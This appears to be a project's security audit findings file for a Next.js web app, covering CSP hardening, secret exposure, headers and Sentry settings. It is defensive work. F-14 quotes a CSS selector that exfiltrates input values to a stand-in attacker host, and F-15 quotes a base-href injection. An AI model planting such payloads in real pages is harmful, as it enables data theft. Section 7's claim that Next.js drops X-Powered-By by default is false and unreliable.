# Findings: CSP, Frontend Security, and Configuration Audit

## 1. Content Security Policy

### [HIGH] F-13: `script-src 'unsafe-inline'` effectively disables XSS protection

**Status**: Fixed

**Resolved in**: `src/proxy.ts`, `src/lib/csp.ts`, `src/app/layout.tsx`, `src/components/seo/JsonLd.tsx`, `src/components/analytics/GTMConsentLoader.tsx`

**Original location**: `next.config.ts:38`

```
script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://connect.facebook.net
```

**Fix**: CSP is now generated per request in middleware with a nonce-based `script-src`. The root theme bootstrap script, JSON-LD scripts, and GTM loader all receive the request nonce, and the static CSP header was removed from `next.config.ts`.

---

### [Low] F-14: `style-src 'unsafe-inline'`

**Status**: Fixed

**Resolved in**: `src/lib/csp.ts`, `src/app/globals.css`, `src/components/measurements/MeasurementWizard.tsx`, `src/components/measurements/NumberSlider.tsx`, `src/components/shared/ScaleSlider.tsx`, `src/components/questionnaire/QuestionnaireProgressBar.tsx`, `src/components/questionnaire/questions/*`, `src/components/ui/Progress.tsx`, `src/app/(dashboard)/profile/page.tsx`, `src/app/(dashboard)/admin/fit-runs/page.tsx`, `src/app/(public)/page.tsx`

**Issue**: Allows CSS injection attacks, including data exfiltration via CSS attribute selectors (e.g., `input[value^="a"] { background: url(attacker.com/a) }`). This is a lower-risk vector than script injection but is still non-ideal.

Tailwind CSS v4 generates static classes — `'unsafe-inline'` is not required for Tailwind in production. It may be required for component libraries that inject inline styles (check `@base-ui/react`).

**Fix**: All `style={...}` usage in `src/` was removed. Dynamic widths and positions now use rounded percent buckets plus static CSS selectors in `globals.css`, the hero background moved to a static class, and `style-src` is now restricted to `'self'`.

---

### [Low] F-15: Missing CSP directives

**Status**: Fixed

**Resolved in**: `next.config.ts`

**Location**: `next.config.ts:31-47`

**Original issue**: Three directives were absent that block common attack vectors:

| Missing directive | Attack it prevents |
|------------------|--------------------|
| `object-src 'none'` | Flash and plugin injection |
| `base-uri 'self'` | `<base href="attacker.com">` injection — changes where relative URLs resolve |
| `form-action 'self'` | Forms silently POSTing to attacker-controlled URLs |

**Fix**: `object-src 'none'`, `base-uri 'self'`, and `form-action 'self'` are now present in the CSP header.

---

### [Info] `frame-ancestors 'none'` is set — good

`frame-ancestors 'none'` in CSP is present, and `X-Frame-Options: DENY` is set. No clickjacking risk.

---

### [Info] `connect-src` dev mode uses `http://127.0.0.1:*`

This is broad but gated on `isDev` via `process.env.NODE_ENV === "development"`. Acceptable.

---

## 2. Environment Variable Exposure

### [CRITICAL] F-01 (cross-reference): `NEXT_PUBLIC_LOCALHOST_DEV_LOGIN_SECRET`

**Location**: `src/app/(auth)/login/page.tsx:285`

Already documented in `01-auth-authorization.md` as F-01. This has been fixed: the localhost dev secret no longer appears in the client bundle.

---

### [Low] F-10 (cross-reference): `/api/health/config` exposes deployment environment

Already documented in `03-api-routes.md` as F-10. This has been fixed by removing `deploymentEnv` from the public response.

---

### [Info] No other `NEXT_PUBLIC_SECRET/KEY/TOKEN` variables found

The original audit found `NEXT_PUBLIC_LOCALHOST_DEV_LOGIN_SECRET` as the only clear secret exposure. That reference has since been removed from the client code. No other `NEXT_PUBLIC_SECRET/KEY/TOKEN` variables were identified in `src/`.

---

## 3. Error Message Exposure

### [Info] Convex error messages are not surfaced to users

Convex mutation errors throw plain strings (`"Not authenticated"`, `"Session not found"`, etc.). These strings do not reach the browser UI in raw form — `useMutation` error handling in the dashboard catches them and shows generic toast messages. No internal stack traces or DB identifiers leak to the frontend.

---

## 4. Next.js Draft Mode Security

### [Low] F-11 (cross-reference): `/api/preview-exit` is unauthenticated

Already documented in `03-api-routes.md` as F-11. This has been fixed by requiring a valid Convex auth token.

### [Info] Preview activation is correctly dual-gated

`/api/preview/route.ts` now requires a valid Convex auth token and resolves the target guide through the authenticated `getDraftGuide` query. The route is POST-only and no longer places a preview secret in the URL.

---

## 5. Deployment-Specific Headers

### [Info] noindex is correctly applied for non-production deployments

`shouldApplyNoIndexHeader` in `src/proxy.ts:161` returns `true` when `request.nextUrl.hostname !== BRAND.host`. The `BRAND.host` is `"bestbikefit4u.eu"`. Preview deployments on Vercel get `X-Robots-Tag: noindex, nofollow, noarchive`. This is belt-and-suspenders with Vercel's own preview deployment controls.

---

## 6. Sentry Configuration

### [Info] Source maps are disabled in production

`next.config.ts` Sentry config: `sourcemaps: { disable: true }`. Source maps are not uploaded to Sentry, so they are not accessible if a Sentry project is compromised or publicly visible.

### [Info] Sentry `silent: true` — verify it still captures errors

`silent: true` suppresses Sentry's own console output during build. This does not affect runtime error capture. Sentry still captures runtime errors in production as long as the `dsn` is configured.

### [Info] No hardcoded DSN found

Sentry DSN is not hardcoded in source files. It is expected to be in `SENTRY_DSN` env var.

---

## 7. `poweredByHeader`

`next.config.ts` does not set `poweredByHeader: false`. By default, Next.js removes the `X-Powered-By` header in production. No action needed.
